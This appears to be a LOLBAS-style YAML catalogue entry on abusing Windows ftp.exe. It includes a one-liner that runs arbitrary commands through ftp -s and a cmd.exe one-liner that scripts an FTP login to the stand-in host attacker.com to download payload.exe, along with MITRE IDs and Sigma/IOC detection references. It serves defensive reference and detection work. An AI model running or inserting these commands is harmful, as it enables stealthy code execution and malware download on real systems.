---
Name: Ftp.exe
Description: A binary designed for connecting to FTP servers
Author: 'Oddvar Moe'
Created: 2018-12-10
Commands:
  - Command: echo !calc.exe > ftpcommands.txt && ftp -s:ftpcommands.txt
    Description: Executes the commands you put inside the text file.
    Usecase: Spawn new process using ftp.exe. Ftp.exe runs cmd /C YourCommand
    Category: Execute
    Privileges: User
    MitreID: T1202
    OperatingSystem: Windows 7, Windows 8, Windows 8.1, Windows 10
  - Command: cmd.exe /c "@echo open attacker.com 21>ftp.txt&@echo USER attacker>>ftp.txt&@echo PASS PaSsWoRd>>ftp.txt&@echo binary>>ftp.txt&@echo GET /payload.exe>>ftp.txt&@echo quit>>ftp.txt&@ftp -s:ftp.txt -v"
    Description: Download
    Usecase: Spawn new process using ftp.exe. Ftp.exe downloads the binary.
    Category: Download
    Privileges: User
    MitreID: T1105
    OperatingSystem: Windows XP, Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10
Full_Path:
  - Path: C:\Windows\System32\ftp.exe
  - Path: C:\Windows\SysWOW64\ftp.exe
Code_Sample:
- Code:
Detection:
 - Sigma: https://github.com/SigmaHQ/sigma/blob/08ca62cc8860f4660e945805d0dd615ce75258c1/rules/windows/process_creation/win_susp_ftp.yml
 - IOC: cmd /c as child process of ftp.exe
Resources:
  - Link: https://twitter.com/0xAmit/status/1070063130636640256
  - Link: https://medium.com/@0xamit/lets-talk-about-security-research-discoveries-and-proper-discussion-etiquette-on-twitter-10f9be6d1939
  - Link: https://ss64.com/nt/ftp.html
  - Link: https://www.asafety.fr/vuln-exploit-poc/windows-dos-powershell-upload-de-fichier-en-ligne-de-commande-one-liner/
Acknowledgement:
  - Person: Casey Smith
    Handle: '@subtee'
  - Person: BennyHusted
    Handle: ''
  - Person: Amit Serper
    Handle: '@0xAmit '
---
